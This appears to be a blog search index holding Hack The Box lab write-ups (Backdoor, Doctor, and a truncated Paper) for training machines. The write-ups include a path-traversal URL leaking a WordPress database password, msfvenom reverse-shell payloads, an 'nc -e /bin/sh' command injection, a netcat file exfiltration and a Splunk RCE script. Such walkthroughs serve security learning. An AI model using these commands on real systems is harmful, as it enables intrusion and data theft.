AVAILABLE!\n\n\n\nMay 8, 2019\n\n\n\n\n\n\n\n\n\n\n\n\n\nTeacher - Hack The Box\n\n1 min\n\nNO WRITEUP AVAILABLE!\n\n\n\nApr 20, 2019\n\n\n\n\n\n\n\n\n\n\n\n\n\nHelp - Hack The Box\n\n1 min\n\nNO WRITEUP AVAILABLE!\n\n\n\nApr 17, 2019\n\n\n\n\n\n\n\n\n\n\n\n\n\nIrked - Hack The Box\n\n1 min\n\nNO WRITEUP AVAILABLE!\n\n\n\nApr 17, 2019\n\n\n\n\n\n\n\n\n\n\n\n\n\nLegacy - Hack The Box\n\n9 min\n\nN/A\n\n\n\nApr 14, 2019\n\n\n\n\n\n\n\n\n\n\n\n\n\nOptimum - Hack The Box\n\n14 min\n\nN/A\n\n\n\nApr 14, 2019\n\n\n\n\n\n\n\n\n\n\n\n\n\nPopcorn - Hack The Box\n\n1 min\n\nNO WRITEUP AVAILABLE!\n\n\n\nApr 14, 2019\n\n\n\n\n\n\n\n\n\n\n\n\n\nLame - Hack The Box\n\n9 min\n\nN/A\n\n\n\nApr 12, 2019\n\n\n\n\n\n\n\n\n\n\n\n\n\nBlue - Hack The Box\n\n6 min\n\nN/A\n\n\n\nApr 9, 2019\n\n\n\n\n\n\n\n\n\n\n\n\n\nNetmon - Hack The Box\n\n1 min\n\nNO WRITEUP AVAILABLE!\n\n\n\nMar 25, 2019\n\n\n\n\n\n\nNo matching items"
  },
  {
    "objectID": "posts/2021-11-23-htb-writeup-backdoor/2021-11-23-htb-writeup-backdoor.html",
    "href": "posts/2021-11-23-htb-writeup-backdoor/2021-11-23-htb-writeup-backdoor.html",
    "title": "Backdoor - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nnmap:\n┌──(void㉿void)-[/htb/backdoor]\n└─$ nmap -Pn -n -sCV 10.129.108.149  \nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)\n|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)\n|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-generator: WordPress 5.8.1\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Backdoor &#8211; Real-Life\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\ndirb:\n+ http://10.129.108.149/index.php (CODE:301|SIZE:0)\n+ http://10.129.108.149/server-status (CODE:403|SIZE:279)\n+ http://10.129.108.149/xmlrpc.php (CODE:405|SIZE:42)                             \n+ http://10.129.108.149/wp-admin/admin.php (CODE:302|SIZE:0)                       \n+ http://10.129.108.149/wp-admin/index.php (CODE:302|SIZE:0)\n+ http://10.129.108.149/wp-content/index.php (CODE:200|SIZE:0)\n+ http://10.129.108.149/wp-admin/network/admin.php (CODE:302|SIZE:0)\n+ http://10.129.108.149/wp-admin/network/index.php (CODE:302|SIZE:0)               \n+ http://10.129.108.149/wp-admin/user/admin.php (CODE:302|SIZE:0)\n+ http://10.129.108.149/wp-admin/user/index.php (CODE:302|SIZE:0)\n\n==&gt; DIRECTORY: http://10.129.108.149/wp-admin/css/\n==&gt; DIRECTORY: http://10.129.108.149/wp-admin/images/\n==&gt; DIRECTORY: http://10.129.108.149/wp-admin/includes/\n==&gt; DIRECTORY: http://10.129.108.149/wp-admin/js/\n==&gt; DIRECTORY: http://10.129.108.149/wp-admin/maint/\n==&gt; DIRECTORY: http://10.129.108.149/wp-admin/network/\n==&gt; DIRECTORY: http://10.129.108.149/wp-admin/user/\n==&gt; DIRECTORY: http://10.129.108.149/wp-content/plugins/\n==&gt; DIRECTORY: http://10.129.108.149/wp-content/themes/\n==&gt; DIRECTORY: http://10.129.108.149/wp-content/upgrade/\n==&gt; DIRECTORY: http://10.129.108.149/wp-content/uploads/  \nnikto:\n+ Server: Apache/2.4.41 (Ubuntu)\n+ Uncommon header 'link' found, with multiple values: (&lt;http://10.129.108.149/index.php/wp-json/&gt;; rel=\"https://api.w.org/\",&lt;http://10.129.108.149/index.php/wp-json/wp/v2/pages/11&gt;; rel=\"alternate\"; type=\"application/json\",&lt;http://10.129.108.149/&gt;; rel=shortlink,)\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type\n+ Uncommon header 'x-redirect-by' found, with contents: WordPress\n+ /wp-links-opml.php: This WordPress script reveals the installed version.\n+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information\n+ /wp-login.php: Wordpress login found\nwpscan:\n┌──(void㉿void)-[/htb/backdoor]\n└─$ wpscan --url http://backdoor.htb/ --enumerate ap\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://backdoor.htb/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://backdoor.htb/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] Upload directory has listing enabled: http://backdoor.htb/wp-content/uploads/\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://backdoor.htb/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.8.1 identified (Latest, released on 2021-09-09).\n | Found By: Rss Generator (Passive Detection)\n |  - http://backdoor.htb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;\n |  - http://backdoor.htb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.8.1&lt;/generator&gt;\n\n[+] WordPress theme in use: twentyseventeen\n | Location: http://backdoor.htb/wp-content/themes/twentyseventeen/\n | Latest Version: 2.8 (up to date)\n | Last Updated: 2021-07-22T00:00:00.000Z\n | Readme: http://backdoor.htb/wp-content/themes/twentyseventeen/readme.txt\n | Style URL: http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208\n | Style Name: Twenty Seventeen\n | Style URI: https://wordpress.org/themes/twentyseventeen/\n | author: \"0xPThree\"\ndescription: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 2.8 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\nWP Version: 5.8.1\nNo plugins (according to wpscan)\n\nLooking through the directories manually we can see that wpscan didn’t really do it’s job as there is a plugin, ebook download, in http://10.129.108.149/wp-content/plugins/. Looking in the readme.txt it seems like it’s running version 1.1.\nA quick google about the plugin and we find a directory traversal vulnerability. 10.129.108.149/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php\n// ** MySQL settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine( 'DB_NAME', 'wordpress' );\n\n/** MySQL database username */\ndefine( 'DB_USER', 'wordpressuser' );\n\n/** MySQL database password */\ndefine( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );\n\n/** MySQL hostname */\ndefine( 'DB_HOST', 'localhost' );\n\n\n\nStep 2\nUse the path traversal to find username; http://10.129.108.149/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd\nWe are unable to extract /home/user/user.txt and/or /home/user/.ssh/id_rsa, but we can verify that we are in the correct directory by extracting /home/user/.bashrc.\nRunning my lfi-list and looking on /proc/sched_debug we can see all locally running services with their PID’s. Among them I find gdbserver on PID 40276. Investigating the pid in question with /proc/40276/cmdline we get the following output: gdbserver --once 0.0.0.0:1337\nVerifying with nmap we see that I missed port 1337.\n$ nmap -p 1337 10.129.108.149     \nPORT     STATE SERVICE\n1337/tcp open  waste\n\n\n\nStep 3\nExploit gdbserver with found script.\n┌──(void㉿void)-[/htb/backdoor]\n└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.30 LPORT=4488 PrependFork=true -o rev.bin\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 106 bytes\nSaved as: rev.bin\n\n┌──(void㉿void)-[/htb/backdoor]\n└─$ python3 gdb-expl.py 10.129.108.149:1337 rev.bin\n[+] Connected to target. Preparing exploit\n[+] Found x64 arch\n[+] Sending payload\n[*] Pwned!! Check your listener\n\n┌──(void㉿void)-[/htb/backdoor]\n└─$ nc -lvnp 4488             \nlistening on [any] 4488 ...\nconnect to [10.10.14.30] from (UNKNOWN) [10.129.108.149] 50400\nid && hostname\nuid=1000(user) gid=1000(user) groups=1000(user)\nBackdoor\ncat user.txt\nd41625febafce97713402b47d1044f48\n\n\n\n\nROOT\n\nStep 1\nFrom our LFI we were able to extract the wordpress database information, lets start by looking around there.\nuser@Backdoor:/home/user$ mysql wordpress -u wordpressuser -p\nEnter password: MQYBJSaD#DxG6qbm\nmysql&gt; show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| wordpress          |\n+--------------------+\n2 rows in set (0.00 sec)\n\nmysql&gt; use wordpress;\nDatabase changed\nmysql&gt; show tables;\n+-----------------------+\n| Tables_in_wordpress   |\n+-----------------------+\n| wp_commentmeta        |\n| wp_comments           |\n| wp_links              |\n| wp_options            |\n| wp_postmeta           |\n| wp_posts              |\n| wp_term_relationships |\n| wp_term_taxonomy      |\n| wp_termmeta           |\n| wp_terms              |\n| wp_usermeta           |\n| wp_users              |\n+-----------------------+\n12 rows in set (0.00 sec)\n\nmysql&gt; select * from wp_users;\n+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+\n| ID | user_login | user_pass                          | user_nicename | user_email          | user_url            | user_registered     | user_activation_key | user_status | display_name |\n+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+\n|  1 | admin      | $P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5. | admin         | admin@wordpress.com | http://backdoor.htb | 2021-07-24 13:19:11 |                     |           0 | admin        |\n+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+\n\n\n\nSaving the WordPress (MD5) hash to a file and trying to crack it with rockyou.txt fails, so I assume this is not the intended path.\n\n\n\nStep 2\nInstead upload linpeas.sh and run. From it we find a interesting process running as root: root         955  0.0  0.0   2608  1800 ?        Ss   04:27   0:07      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done\nThe script will start a screen with the name &lt;pid&gt;.root as root. Running ps aux we can see pid 1017 for the active screen, meaning the name is 1017.root.\nuser@Backdoor:/tmp$ ps aux | grep root\n[... snip ...]\nroot        1017  0.0  0.1   6952  2504 ?        Ss   04:27   0:00 SCREEN -dmS root\nScreen has the SUID bit set, which is mostly done for screen sharing.\nuser@Backdoor:/tmp$ ls -al $(which screen)\n-rwsr-xr-x 1 root root 474280 Feb 23  2021 /usr/bin/screen\nAttach the root screen (1017.root) and grab the flag.\nuser@Backdoor:/tmp$ screen -x root/1017.root\nroot@Backdoor:~$ id\nuid=0(root) gid=0(root) groups=0(root)\nroot@Backdoor:~# cat root.txt \nebd680a7fc4ffa43b442fa64cb2e8644\n\n\n\n\nReferences\nwordpress ebook download: https://www.exploit-db.com/exploits/39575\ngdbserver rce: https://www.exploit-db.com/exploits/50539\nscreen session sharing: https://wiki.networksecuritytoolkit.org/index.php/HowTo_Share_A_Terminal_Session_Using_Screen"
  },
  {
    "objectID": "posts/2020-11-04-htb-writeup-doctor/2020-11-04-htb-writeup-doctor.html",
    "href": "posts/2020-11-04-htb-writeup-doctor/2020-11-04-htb-writeup-doctor.html",
    "title": "Doctor - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:/git/htb/doctor# nmap -Pn -n -sC -sV 10.10.10.209 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 12:51 CEST Nmap scan report for 10.10.10.209 Host is up (0.035s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |http-title: Doctor 8089/tcp open ssl/http Splunkd httpd | http-robots.txt: 1 disallowed entry |/ |_http-server-header: Splunkd |_http-title: splunkd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Not valid before: 2020-09-06T15:57:27 |_Not valid after: 2023-09-06T15:57:27 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nDIRB:\n\nhttp://10.10.10.209/index.html (CODE:200|SIZE:19848)\n\nNIKTO:\n\n\n\nVisiting the http://10.10.10.209 we find a domain name, doctors.htb - add it to /etc/hosts. Three potential users, Jade Guzman, Hannah Ford, James Wilson, and blog posts by Admin. We find nothing more of interest so lets move ahead to http://doctors.htb.\nWe are greeted with a login promtp. Trying different email addresses it seems like the error message is the same no matter what. Sign up to the site and create an account. Once logged in we are able to create a post, and update our profile.\nOur first post is at http://doctors.htb/post/2, notice that the first post got number 2 in the url. Visit http://doctors.htb/post/1 and we find a post by user Admin.\nadmin 2020-09-18 Doctor blog\nA free blog to share medical knowledge. Be kind!\nWe can view all post by user Admin on http://doctors.htb/user/admin, however he’s only done one.\nFrom the post content field we have code execution through a URL validation function. All URL’s posted in the content field will be executed to see if valid, giving us some kind of Code Execution.\nContent: http://10.10.14.9:4488\nroot@nidus:/git/htb/doctor# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.9] from (UNKNOWN) [10.10.10.209] 42406 GET / HTTP/1.1 Host: 10.10.14.9:4488 User-Agent: curl/7.68.0 Accept: /\nTrying to setup reverse payload through php etc doesn’t do anything, so I think we need to do the RCE in the URL. After a while I found the post from ‘Shift or Die’ about Shell Injection without withspaces and played around with that. Reading the forums + tweaking that one line eventually gave me a reverse shell.\nContent: http://10.10.14.9/\\((nc.traditional\\)IFS’10.10.14.9’\\(IFS'4488'\\)IFS-e/bin/sh)\nroot@nidus:/git/htb/doctor# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.9] from (UNKNOWN) [10.10.10.209] 42612 whoami web\nUpgrade the shell ( python3 -c ‘import pty;pty.spawn(“/bin/bash”)’; ) Once we have a foothold, the first dir we land in has a script called blog.sh, we see the script pointing towards a database file and we get a secret key(?).\nweb@doctor:~$ cat blog.sh #!/bin/bash SECRET_KEY=1234 SQLALCHEMY_DATABASE_URI=sqlite://///home/web/blog/flaskblog/site.db /usr/bin/python3 /home/web/blog/run.py\nTransfer the database file to your local computer and investigate it. root@nidus:/git/htb/doctor# nc -lp 1234 &gt; site.db web@doctor:~/blog/flaskblog$ nc -w 3 10.10.14.9 1234 &lt; site.db\nroot@nidus:/git/htb/doctor# sqlite3 site.db SQLite version 3.33.0 2020-08-14 13:23:32 Enter “.help” for usage hints. sqlite&gt; .tables post user sqlite&gt; .schema user CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(20) NOT NULL, email VARCHAR(120) NOT NULL, image_file VARCHAR(20) NOT NULL, password VARCHAR(60) NOT NULL, PRIMARY KEY (id), UNIQUE (username), UNIQUE (email) ); sqlite&gt; .header ON sqlite&gt; select * from user; id|username|email|image_file|password 1|admin|admin@doctor.htb|default.gif|$2b\\(12\\)Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S 2|p3|p3@p3.se|default.gif|$2b\\(12\\)foJvOG4jKtMmHjJ6n6YU7unB2zQQnIDlYqHkvvttNKsafJyFn/9DK\nThe hashes for me are unknown, and using Kali’s ‘hash-identifier’ gives nothing. Crackstation are unable to crack the hashes, so this might be a rabbit hole.\nEnumerate the logs! As the box image suggests the logs should be a part of this box. Looking through /var/log/apache2 we find backup sticking out like a sore thumb. Grep it for password and we got a hit!\nweb@doctor:/var/log/apache2$ cat backup | grep password 10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] “POST /reset_password?email=Guitar123” 500 453 “http://doctor.htb/reset_password”\nChange to user Shaun and grab user.txt\nweb@doctor:/var/log/apache2$ su shaun Password: Guitar123\nshaun@doctor:/var/log/apache2$ shaun@doctor:/var/log/apache2$ cat ~/user.txt 9ebedf116da41ba52906a5ab9ca5d8f8\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nLooking at the running processes we see that splunkd is running as root on port 8089.\n\nroot 1129 0.2 2.2 280284 91684 ? Sl Sep27 2:58 splunkd -p 8089 start\nGoogling around for Splunk exploits I came across a script called PySplunkWhisperer2_remote.py, that can be used for RCE. As Splunk is running as root, in our case, we can probably use this RCE to gain a root shell.\n\nThe script syntaxes and how to use them, especially payload, was difficult for me to graps. After some further googling I found a page from eapolsniper, explaning a lot of different ways on how to use this exploit. With this new found knowledge;\n\nSetup a local nc listener.\nExploit: root@nidus:/git/htb/doctor# python3 PySplunkWhisperer2_remote.py –host 10.10.10.209 –username shaun –password Guitar123 –payload “nc.traditional -e /bin/sh 10.10.14.9 4488” –lhost 10.10.14.9 Running in remote mode (Remote Code Execution) [.] Authenticating… [+] Authenticated [.] Creating malicious app bundle… [+] Created malicious app bundle in: /tmp/tmpre8z_d99.tar [+] Started HTTP server for remote mode [.] Installing app from: http://10.10.14.9:8181/ 10.10.10.209 - - [05/Nov/2020 12:13:19] “GET / HTTP/1.1” 200 - [+] App installed, your code should be running now!\nroot@nidus:/git/htb/doctor# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.9] from (UNKNOWN) [10.10.10.209] 56250 whoami root cat /root/root.txt 45f20a790d86b9e8334d447f9e878605\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nShell Injection - nc.traditional https://shiftordie.de/blog/2011/12/23/shell-injection-without-whitespace/\nSQLite3 CLI: https://sqlite.org/cli.html\nSplunk Exploit: https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/"
  },
  {
    "objectID": "posts/2022-02-16-htb-writeup-paper/2022-02-16-htb-writeup-paper.html",
    "href": "posts/2022-02-16-htb-writeup-paper/2022-02-16-htb-writeup-paper.html",
    "title": "Paper - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nnmap:\n$ nmap -p- 10.10.11.143   \nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\n\n$ nmap -Pn -n -sCV -p22,80,443 10.10.11.143\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)\n| ssh-hostkey: \n|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)\n|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)\n|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)\n80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)\n|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\n|_http-title: HTTP Server Test Page powered by CentOS\n443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)\n|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\n|_http-title: HTTP Server Test Page powered by CentOS\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US\n| Subject Alternative Name: DNS:localhost.localdomain\n| Not valid before: 2021-07-03T08:52:34\n|_Not valid after:  2022-07-08T10:32:34\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\n\n$ sudo nmap -sU --top-port=50 --open 10.10.11.143                                                                                                      1 ⨯\nPORT     STATE         SERVICE\n5353/udp open|filtered zeroconf\nnikto:\nPORT 80:\n+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\n+ Uncommon header 'x-backend-server' found, with contents: office.paper\n+ Retrieved x-powered-by header: PHP/7.2.24\n+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST\n\nPORT 443:\n+ SSL Info:        Subject:  /C=US/O=Unspecified/CN=localhost.localdomain/emailAddress=root@localhost.localdomain\n                   Ciphers:  TLS_AES_256_GCM_SHA384\n                   Issuer:   /C=US/O=Unspecified/OU=ca-3899279223185377061/CN=localhost.localdomain/emailAddress=root@localhost.localdomain\n+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\nwpscan:\n$ wpscan --url http://office.paper --enumerate ap\n[+] Headers\n | Interesting Entries:\n |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\n |  - X-Powered-By: PHP/7.2.24\n |  - X-Backend-Server: office.paper\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] WordPress readme found: http://office.paper/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).\n | Found By: Rss Generator (Passive Detection)\n |  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;\n |  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;\n\n[+] WordPress theme in use: construction-techup\n | Location: http://office.paper/wp-content/themes/construction-techup/\n | Last Updated: 2021-07-17T00:00:00.000Z\n | Readme: http://office.paper/wp-content/themes/construction-techup/readme.txt\n | [!] The version is out of date, the latest version is 1.4\n | Style URL: http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1\n | Style Name: Construction Techup\n | author: \"0xPThree\"\ndescription: Construction Techup is child theme of Techup a Free WordPress Theme useful for Business, corporate a...\n | Author: wptexture\n | Author URI: https://testerwp.com/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 1.1 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://office.paper/wp-content/themes/construction-techup/style.css?ver=1.1, Match: 'Version: 1.1'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\nNikto is MVP and finds office.paper\nhttp://office.paper/ is running on WP 5.2.3\n\n\n\n\nStep 2\nLooking for WP 5.2.3 vulnerabilities we find a unauthed view of private posts.\n┌──(void㉿void)-[/htb/paper]\n└─$ searchsploit wordpress 5.2.3\n[... snip ...]\nWordPress Core &lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts                    | multiple/webapps/47690.md\nReading about the vulnerability it is as simple as adding ?static=1 to view posts. http://office.paper/?static=1 gives us:\n\n“Micheal please remove the secret from drafts for gods sake!” “Michael, you have to stop putting secrets in the drafts.” “# Secret Registration URL of new Employee chat system http://chat.office.paper/register/8qozr226AhkCHZdyY” “# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders.”\n\nUse the provided link and create an account to the rocket.chat platform.\nReading the General chat we see that Dwight has created the bot Recyclops that is able to list- and fetch files. Start a private conversation with Recyclops and enumerate.\n$ list\nFetching the directory listing of /sales/\ntotal 8\ndrwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .\ndrwx------ 12 dwight dwight 4096 Feb 14 15:17 ..\ndrwxr-xr-x 2 dwight dwight 27 Sep 15 13:03 sale\ndrwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2\n\n$ list sale\nFetching the directory listing of sale\ntotal 4\ndrwxr-xr-x 2 dwight dwight 27 Sep 15 13:03 .\ndrwxr-xr-x 4 dwight dwight 32 Jul 3 2021 ..\n-rw-r--r-- 1 dwight dwight 158 Sep 15 13:03 portfolio.txt\n\n$ file sale/portfolio.txt\n&lt;!=====Contents of file sale/portfolio.txt=====&gt;\nPortfolio\n----------\n- Bill\n- Served the country in war\n- Family built the country\n- purchased paper worth a million dollars\n- will probably fire me.\n&lt;!=====End of file sale/portfolio.txt=====&gt;\n\n$ list sale_2\ntotal 4\ndrwxr-xr-x 2 dwight dwight 27 Jul 3 2021 .\ndrwxr-xr-x 4 dwight dwight 32 Jul 3 2021 ..\n-rw-r--r-- 1 dwight dwight 113 Jul 3 2021 portfolio.txt\n\n$ file sale_2/portfolio.txt\n&lt;!=====Contents of file sale_2/portfolio.txt=====&gt;\nPortfolio\n----------\n- Christian\n- Still No idea how micheal made the sale!\n- Need further clarifications.\n&lt;!=====End of file sale_2/portfolio.txt=====&gt;\n\n$ list ../\nFetching the directory listing of ../\ntotal 76\ndrwx------ 12 dwight dwight 4096 Feb 14 15:17 .\ndrwxr-xr-x. 3 root root 20 Feb 14 15:22 ..\nlrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -&gt; /dev/null\n-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout\n-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile\n-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc\ndrwxrwxr-x 2 dwight dwight 34 Feb 13 11:05 bin\n-rwxr-xr-x 1 dwight dwight 1219 Feb 13 11:07 bot_restart.sh\n-rwxrwxr-x 1 dwight dwight 9627 Feb 14 14:04 bumble.sh\ndrwx------ 5 dwight dwight 56 Jul 3 2021 .config\n-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth\n-rw-rw-r-- 1 dwight dwight 2434 Feb 14 08:05 exploit.py\n-rwxrwxr-x 1 dwight dwight 9628 Feb 14 07:50 exploit.sh\ndrwx------ 3 dwight dwight 69 Feb 14 11:00 .gnupg\ndrwx------ 8 dwight dwight 4096 Sep 16 07:57 hubot\n-rw-rw-r-- 1 dwight dwight 18 Sep 16 07:24 .hubot_history\n-rw------- 1 dwight dwight 36 Feb 14 11:12 .lesshst\ndrwx------ 4 dwight dwight 30 Feb 13 10:25 .local\ndrwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla\ndrwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm\n-rw-rw-r-- 1 dwight dwight 0 Feb 14 15:21 root.txt\ndrwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales\ndrwx------ 2 dwight dwight 6 Sep 16 08:56 .ssh\n-r-------- 1 dwight dwight 33 Feb 13 